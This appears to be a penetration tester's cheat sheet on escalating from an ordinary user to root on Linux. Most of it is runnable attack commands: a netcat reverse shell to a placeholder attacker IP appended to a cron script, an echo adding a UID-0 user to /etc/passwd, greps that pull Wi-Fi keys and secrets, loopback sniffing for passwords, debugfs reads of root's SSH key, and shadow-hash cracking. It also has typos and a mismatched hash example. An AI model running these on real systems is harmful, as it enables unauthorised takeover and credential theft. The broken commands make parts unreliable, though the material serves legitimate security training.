# Description

Upgrading yourself from a regular user with little to no privileges, to root with full control over the system.

# Command Syntax

## System Information

### Kernel Information

```bash
uname -a
```

### Operating System Information

```bash
cat /etc/issue
cat /etc/*-release
```

### View $PATH

```bash
echo $PATH | tr ":" "\n"
```

## Network Configuration

### View IP Configuration Information

```bash
ifconifg -a
```

### Print Current Network Routes

```bash
route -n
```

### Check DNS Resolver

```bash
cat /etc/resolv.conf
```

### View ARP Table

```bash
arp -en
```

### List All Active TCP and UDP Connections

```bash
netstat -auntp

ss -twurp
```

### Dump Clear Text PSK Keys from the Network Manager.

```bash
cat /etc/NetworkManager/system-connections/* |grep -E "^id|^psk"
```

## User Information

### Current User

```bash
id
```

```bash 
grep $USER /etc/passwd
```

### Last Logged on

```bash
lastlog | grep -v '**Never logged in**' 
```

### Currently Logged on User

```bash
w
```

### All Users with UID and GUID Information

```bash
for user in $(cat /etc/passwd | cut -f1 -d ":"); do id $user; done
```

### List All Root Accounts

```bash
cat /etc/passwd |cut -f1,3,4 -d":" | grep "0:0" |cut -f1 -d":" |awk '{print $1}'
```

## Running Processes

### List Running Processes

```bash
ps auxwww
```

### Processes Running as Root

```bash
ps -u root
```

### Processes Running as Current User

```bash
ps -u $USER
```

## File and Folder Permissions

### Can We Read Shadow?

```bash
cat /etc/shadow
```

### Find Sticky Bit

```bash
find / -perm -1000 -type d 2>/dev/null
```

### Find SUID

```bash
find / -perm -u=s -type f 2>/dev/null 
```

### Find SGID

```bash
find / -perm -g=s -type f 2>/dev/null
```

### World Writeable Files

```bash
find -perm -2 type -f 2>/dev/null   
```

### List Configuration Files in /etc/

```bash
ls -al /etc/*.conf
```

### Grep for Interesting Keywords in Configuration Files

```bash
grep 'pass*' /etc/*.conf 2> /dev/null
grep 'key' /etc/*.conf 2> /dev/null
grep 'secret' /etc/*.conf 2> /dev/null
```

### Can We List the Contents of root/?

```bash
ls -als root/
```

### Can We Read other Users History Files?

```bash
find /* -name *.*history* -print 2> /dev/null 
```

## Cronjobs and Scheduled Tasks

```bash
cat /etc/crontab  
ls -als /etc/cron.*
```

## Check for Tasks that Are Run as Root and Are World Writeable.

```bash
find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 
```

## Metasploit Modules

### Post Exploit Enumeration

```bash
post/linux/gather/enum_configs
post/linux/gather/enum_system
post/linux/gather/enum_network
post/linux/gather/enum_psk
post/linux/gather/hashdump
post/linux/gather/openvpn_credentials
post/linux/gather/phpmyadmin_credsteal 
```

## Unsecured Files

### Search by Filetype

```bash
find / -type f \( -iname \*.txt\* -o -iname \*.log\* -o -iname \*.ps1\* -o -iname \*.exe\* -o -iname \*.ini\* -o -iname \*.kdbx\* -o -iname \*.pdf\* -o -iname \*.xls\* -o -iname \*.xlsx\* -o -iname \*.doc\* -o -iname \*.docx\* \) 2> /dev/null
```

## Inspecting Service Footprints

**Monitor active processes** for passwords and other credentials

```bash
watch -n 1 "ps -aux | grep pass"
```

**Sniff passwords** on the loopback interface using `tcpdump`

```bash
sudo tcpdump -i lo -A | grep "pass"
```

**Inspect Tcpdump**

```bash
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
```

### _Cron_ Jobs

Look for CronJobs that are running with higher privileges but are writable by the current user. If found, you can modify these scripts to escalate privileges.

1.  **Find CRON Jobs**

```bash
grep "CRON" /var/log/syslog
or
cat /var/log/cron.log
```

2.  **Check permissions** for the script

```bash
ls -lah /path/to/script.sh
```

3.  **Modify the script to add a reverse shell** (in case we have permissions to edit), depending on the case another possible payloads could be added, for example adding a new root user.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
```

4.  **(Optional)** Other Commands to Inspect Cron Jobs.

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### Password Files

#### _/etc/passwd_

The misconfiguration is if we have permissions to edit this file, which we should not have, in which case we will modify it to **add a new root user**.

1.  Create the hash

```bash
openssl passwd Password123
```

2.  Add the hash to the `/etc/passwd` file

```bash
# This is just an example using the output of the previous command.
echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
```

3.  Switch to the new user

```bash
su newroot

# Verify root access
id
```

#### _/etc/shadow_

The misconfiguration is that we should not be able to look the contents of this file, if we can do it then we could see the **hashes for the users and crack them**.

1.  Get the hash out.

```bash
cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
```

2.  Crack the hash

```bash
# John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt

# Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
```

3.  Show the password

```bash
# John The Ripper
john --show [root_user]_hash.txt

# Hashcat
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
```

### Setuid Binaries and Capabilities

#### Setuid Binaries

**Setuid** (Set User ID) binaries are executables that run with the privileges of the file owner, which is often root. Exploiting these binaries can grant elevated access if the binary is misconfigured or vulnerable.

1.  **Find Setuid Binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

2.  **Inspect Permissions and Owners:**

```bash
ls -l $(find / -perm -4000 -type f 2>/dev/null)
```

3.  **Check for Vulnerabilities:**

-   Review the setuid binaries for known vulnerabilities.
-   Check if they can be exploited by running as a different user.
-   Utilize tools like [GTFOBins](https://gtfobins.github.io/) to find specific exploitation techniques for binaries.

#### Exploiting Setuid Binaries

1.  **Finding the Process ID (PID) of a Running Binary:**

```bash
ps u -C [binary_name]
```

2.  **Inspect Credentials of a Running Process:**

```bash
cat /proc/[PID]/status | grep Uid
```

3.  **Getting a Reverse Shell Using `find`:**

```bash
find [directory] -exec [path_to_shell] \;
```

4.  **Exploit:**

```bash
# Replace [vulnerable_binary] with the name of the binary you are targeting.
find / -name [vulnerable_binary] -exec /bin/bash -p \;
```

#### Capabilities

Linux capabilities allow for finer-grained control over the privileges a process has, which can sometimes be exploited to escalate privileges.

1.  **Enumerate Capabilities:**

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

2.  **Inspect a Specific Binary for Capabilities:**

```bash
getcap [binary_path]

# For example
getcap /usr/bin/nmap
```

3.  **Adjust Capabilities (Requires root):**

```bash
setcap [capabilities] [binary_path]

# Example to add CAP_DAC_OVERRIDE to a binary
setcap cap_dac_override=eip /path/to/binary
```

4.  **Remove Capabilities (Requires root):**

```bash
setcap -r [binary_path]

# For example
setcap -r /usr/bin/nmap
```

**Useful Resources:**

-   [GTFOBins](https://gtfobins.github.io/) - A curated list of Unix binaries that can be exploited for privilege escalation.
-   [Linux Capabilities Documentation](https://man7.org/linux/man-pages/man7/capabilities.7.html) - Detailed documentation on Linux capabilities.

#### Table of Capabilities

| **Capability Name**         | **Description**                                                                                                       | **Potential Impact**                                                                                                                                                   |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CAP\_AUDIT\_CONTROL**     | Allows enabling or disabling kernel auditing.                                                                         | Can be used to disable auditing mechanisms and evade detection.                                                                                                        |
| **CAP\_AUDIT\_WRITE**       | Allows writing records to the kernel auditing log.                                                                    | Can be used to manipulate or inject log entries, potentially covering up malicious activities.                                                                         |
| **CAP\_BLOCK\_SUSPEND**     | Prevents the system from suspending or hibernating.                                                                   | Can be used to keep a system awake, which might be useful for long-running attacks or preventing automatic lockdowns.                                                  |
| **CAP\_CHOWN**              | Allows arbitrary changes to file UIDs and GIDs.                                                                       | Enables changing file ownership, potentially allowing privilege escalation or tampering with critical files.                                                           |
| **CAP\_DAC\_OVERRIDE**      | Bypasses file read, write, and execute permission checks.                                                             | Provides unrestricted access to files, regardless of permissions, which can be used to access or modify sensitive files.                                               |
| **CAP\_DAC\_READ\_SEARCH**  | Bypasses file and directory read and execute permission checks.                                                       | Allows reading and searching files and directories that would normally be restricted.                                                                                  |
| **CAP\_FOWNER**             | Bypasses permission checks on operations that require the filesystem UID of the process to match the UID of the file. | Allows performing actions on files that normally require matching ownership, potentially enabling unauthorized file modifications.                                     |
| **CAP\_IPC\_LOCK**          | Allows locking memory into RAM.                                                                                       | Can be used to prevent critical memory from being swapped out, which may be useful for maintaining persistence or performance in an attack.                            |
| **CAP\_KILL**               | Allows sending signals to processes owned by other users.                                                             | Can be used to terminate or signal processes belonging to other users, potentially disrupting services or attacking other users' processes.                            |
| **CAP\_MAC\_ADMIN**         | Allows configuring or changing Mandatory Access Control (MAC) settings.                                               | Provides the ability to alter MAC policies, which could weaken security policies or bypass certain security controls.                                                  |
| **CAP\_NET\_BIND\_SERVICE** | Allows binding sockets to privileged ports (ports below 1024).                                                        | Enables services to listen on standard ports (e.g., 80, 443) without requiring root privileges, which might be used to disguise malicious services as legitimate ones. |
| **CAP\_NET\_RAW**           | Allows using raw and packet sockets.                                                                                  | Can be used for network sniffing, crafting custom packets, or bypassing network filters and protections.                                                               |
| **CAP\_SETGID**             | Allows changing the GID of a process.                                                                                 | Enables changing the group ID of processes, which can affect group-based permissions and access controls.                                                              |
| **CAP\_SETPCAP**            | Allows transferring and removing capabilities from processes.                                                         | Enables modifying the capabilities of running processes, which can be used to escalate privileges or evade detection.                                                  |
| **CAP\_SETUID**             | Allows changing the UID of a process.                                                                                 | Provides the ability to change the user ID of processes, potentially leading to privilege escalation or impersonation.                                                 |

## Abusing _SUDO_

**Check what we can run as sudo without password**

```bash
sudo -l
```

**All Possible SUID to Exploit** are available in this page _[GTFOBins](https://gtfobins.github.io/)_.

**Inspect syslog file for process relevant events**

```bash
grep [process_name] /var/log/syslog
```

## Kernel Exploitations

This is just a table reference, there are a lot of other possible kernel exploits.

| **CVE Identifier** | **Description** | **Target Kernel Versions**                            | **Exploit URL**                                                       |
| ------------------ | --------------- | ----------------------------------------------------- | --------------------------------------------------------------------- |
| **CVE-2010-3904**  | RDS             | Linux Kernel <= 2.6.36-rc8                            | [Exploit](https://www.exploit-db.com/exploits/15285/)                 |
| **CVE-2010-4258**  | Full Nelson     | Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)           | [Exploit](https://www.exploit-db.com/exploits/15704/)                 |
| **CVE-2012-0056**  | Mempodipper     | Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) | [Exploit](https://www.exploit-db.com/exploits/17568)                  |
| **CVE-2016-5195**  | DirtyCow        | Linux Kernel <= 3.19.0-73.8                           | [Exploit 1](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) |
[Exploit 2](https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c) |
| **CVE-2016-5696** | TCP Remote Code Execution | Linux Kernel 3.6 - 4.7 | [Exploit](https://github.com/gtworek/DirtyCow/blob/master/tcp-4.7.c) |
| **CVE-2017-8890** | Race Condition in Linux Kernel | Linux Kernel < 4.11.6 | [Exploit](https://www.exploit-db.com/exploits/42127) |
| **CVE-2018-8897** | Insecure Use of a Memory Barrier | Linux Kernel 3.14 - 4.15 | [Exploit](https://github.com/stealthc/Kernel-Exploits/tree/master/CVE-2018-8897) |
| **CVE-2019-7304** | Race Condition in OverlayFS | Linux Kernel 4.10 - 4.15 | [Exploit](https://github.com/shellphish/exploits/tree/master/CVE-2019-7304) |
| **CVE-2021-4034** | PwnKit | Linux Kernel 4.4 - 5.8 | [Exploit](https://github.com/ly4k/PwnKit) |
| **CVE-2020-14386** | Privilege Escalation via OverlayFS | Linux Kernel 4.8 - 5.7 | [Exploit](https://github.com/0x00-0x00/CVE-2020-14386) |
| **CVE-2021-3156** | Sudo Privilege Escalation | Sudo versions < 1.9.5p2 | [Exploit](https://www.exploit-db.com/exploits/49610) |
| **CVE-2021-33034** | Privilege Escalation via the Kernel | Linux Kernel 5.4 - 5.10.4 | [Exploit](https://github.com/0x00-0x00/CVE-2021-33034) |
| **CVE-2022-0847** | DirtyPipe | Linux Kernel 5.8 < 5.16.11 | [Exploit](https://www.exploit-db.com/exploits/50808) |

## Wildcard Exploitation

Wildcard exploitation involves leveraging wildcards (`*`, `?`, `[]`) in file and command operations to gain unauthorized access or perform unintended actions. This section covers common methods and examples for exploiting wildcards in Linux environments.

### Wildcard Basics

-   **Asterisk (\*)**: Matches any number of characters, including zero.
-   **Question Mark (?)**: Matches exactly one character.
-   **Square Brackets (\[\]):** Matches any one of the enclosed characters.

### Exploitation Guide

Since this is a complex exploitation technique, if we find a script, cron jobs, tasks or else for which we can perform wildcard exploitation, we could follow these two guides on how to do it:

-   **[Tar Wildcard Injection](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)**
-   **[Wildcards with tar](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)**

### Exploiting Wildcards in Command Execution

1.  **Wildcard Expansion in Commands:** Wildcards can be used to execute commands on multiple files or directories. This can be exploited if an application or script does not handle wildcards properly.

```bash
ls /var/log/*
```

2.  **Misconfigured Scripts:** If a script uses wildcards in a vulnerable way, it can lead to command injection or unintended behavior.

```bash
# Example vulnerable script
tar -cvf archive.tar.gz /var/log/*
```

### Exploiting Wildcards in File Operations

1.  **File Creation and Modification:** Wildcards can be used to create or modify multiple files if the application or script does not properly sanitize input.

```bash
touch /tmp/file_*
```

2.  **Race Conditions:** Wildcards in file operations can be exploited to create race conditions.

```bash
# If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
cp /etc/* /tmp/backup/
```

## Disk Group Permissions

If checking permissions we found that we belong to the disk group, we can use this [guide](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group) for accessing the filesystem as root; this should be used to:

1.  See files and their contents.
2.  Get a reverse shell.
3.  Modify permissions to be root.
4.  Add a new root user account that we could use.

**Exploit example**

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

## MySQL Privilege Escalation

If MySQL is running as root and you have credentials to log in, you can execute system commands directly from the database.

```bash
select sys_exec('whoami');
select sys_eval('whoami');
```

## User-Installed Software

Check for third-party software installed by the user. These programs might have vulnerabilities, so it's important to investigate further.

**Common directories for user-installed software:**

```bash
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```

**Check installed software by distribution:**

```bash
# Debian/Ubuntu
dpkg -l

# CentOS/openSUSE/Fedora/RHEL
rpm -qa

# OpenBSD/FreeBSD
pkg_info
```

## Weak, Reused, and Plaintext Passwords

-   Check web server configuration files (`config.php` or similar) for database connection details, which might reveal admin passwords.
-   Check for reused or weak passwords in databases.

**Common weak/reused passwords**

```bash
root:root
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

**Check for plaintext passwords**

```bash
# Anything interesting in the mail folder?
/var/mail
/var/spool/mail
```

**Use LinEnum to search for passwords**

```bash
./LinEnum.sh -t -k password
```

## Internal Services

## Display Active Network Connections

```bash
# List network services
netstat -anlp
netstat -ano
```

## Types of Addresses

-   **Local address 0.0.0.0**: Service is listening on all interfaces (external and internal). Anyone can connect to it.
-   **Local address 127.0.0.1**: Service is only listening for connections from the local machine. **This is important to investigate**.
-   **Local address 192.168.x.x**: Service is only listening for connections from the local network (internal users). **This is important to investigate**.

## World-Writable Scripts Invoked as Root

If you find scripts that are owned by root but writable by others, you can inject malicious code. This may escalate your privileges when the script is run by root, either manually or automatically (via cronjobs, for example).

**Commands to find world-writable files and directories:**

```bash
# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World-executable directories
find / -perm -o x -type d 2>/dev/null

# World-writable and executable directories
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

## Unmounted FileSystems

Sometimes unmounted filesystems can contain sensitive data or configuration files. If found, mount them and re-check for privilege escalation opportunities.

**Commands to check for unmounted filesystems:**

```bash
mount -l
cat /etc/fstab
```

## SUID and GUID Files

## Understanding SUID and GUID

-   **SUID (Set User ID):** when a file with the SUID bit set is executed, it runs with the permissions of the file's owner (often root) rather than the user who executed it. This can lead to privilege escalation if the file allows unintended actions. For example, if an attacker can execute a root-owned binary with SUID enabled, they could gain root privileges.
    
-   **GUID (Set Group ID):** similarly, a file with the GUID bit set runs with the permissions of the file's group. While less dangerous than SUID, this could still result in privilege escalation if the group has elevated privileges.

## Finding SUID and GUID Files

```bash
# Find SUID files
find / -perm -u=s -type f 2>/dev/null

# Find GUID files
find / -perm -g=s -type f 2>/dev/null
```

## Determining Exploitability

After finding them we need to find if they can be used for privilege escalation, there are a **few options available**:

-   **[GTFOBins](https://gtfobins.github.io/)**: here we can find a complete list of all exploitable SUIDs and GUIDs as well as their command to escalate privileges.
    
-   **Custom SUID/SGID Files**: If custom binaries or scripts are found with SUID/SGID permissions (especially those created by users), they may be misconfigured and vulnerable.

```bash
# Option 1: Use strings to examine the contents.
strings /path/to/suid-binary

# Option 2: Check for system calls or file execution.
ltrace /path/to/suid-binary

# Option 3: Exploit PATH Vulnerability: if the SUID binary calls another program (e.g., /bin/cp or /bin/sh), you might be able to manipulate the $PATH variable to run your own malicious binary instead.
# Create a malicious version of the expected program
echo '/bin/sh' > /tmp/cp
chmod +x /tmp/cp

# Modify PATH to prioritize your malicious version
export PATH=/tmp:$PATH

# Run the vulnerable SUID program
/path/to/suid-program
```

-   **Examine Writable SUID Binaries**: If any SUID binaries are writable, you can modify them directly to add malicious code; this is extremely rare but worth checking.

```bash
# Find writable SUID files
find / -perm -u=s -writable -type f 2>/dev/null

# If a writable SUID binary is found, you can inject your own code and run it with elevated privileges.
```

-   **Finding Potentially Dangerous Custom Scripts**: often, custom scripts used in cronjobs or other automated tasks may have the SUID/SGID bit set or be writable. If they are writable by your user, you can edit these scripts to escalate privileges.

```bash
# Find scripts in cronjobs or system directories that may have SUID or GUID set
find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
```

## Scripts

## LinPEAS

**LinPEAS** (Linux Privilege Escalation Awesome Script) is used for enumerating potential privilege escalation vectors.

**Usage**

```bash
./linpeas.sh
```

**Output to a file while preserving colors**

```bash
./linpeas.sh | tee linpeas_output.txt
```

**Convert output file to HTML**

```bash
# 1. Download file from victim to local Kali, we could use techniques from section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./linpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# (Optional) We could also convert it to PDF.
python3 json2pdf.py peass.json peass.pdf
```

## LinEnum

**LinEnum** is a script designed to perform enumeration of information related to privilege escalation on Linux systems.

**Usage**

```bash
./LinEnum.sh

# Search for passwords
./LinEnum.sh -t -k password
```

**Save output to a file**

```bash
./LinEnum.sh | tee linenum_output.txt
```

## Unix-privesc-check

**Unix-privesc-check** is a script that checks for common privilege escalation vectors on Unix-like systems.

**Usage**

```bash
./unix-privesc-check.sh
```

**Save output to a file**

```bash
./unix-privesc-check.sh | tee unix_privesc_check_output.txt
```

## Checksec

**Checksec** is a tool that checks various security-related features of the kernel and binaries.

**Usage**

```bash
checksec --all
```

## Peepdf

**Peepdf** is a tool for analyzing and extracting information from PDF files, which can be used to find potential exploits.

**Usage**

```bash
peepdf.py file.pdf
```

## Exploit Suggester

**Usage**

```bash
python3 exploit-suggester.py
```

# Related Notes

[MOC - Post-Exploitation](../../../0%20-%20MOCs/MOC%20-%20Post-Exploitation.md)

[MOC - Checklists](../../../0%20-%20MOCs/MOC%20-%20Checklists.md)

# References

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#preseed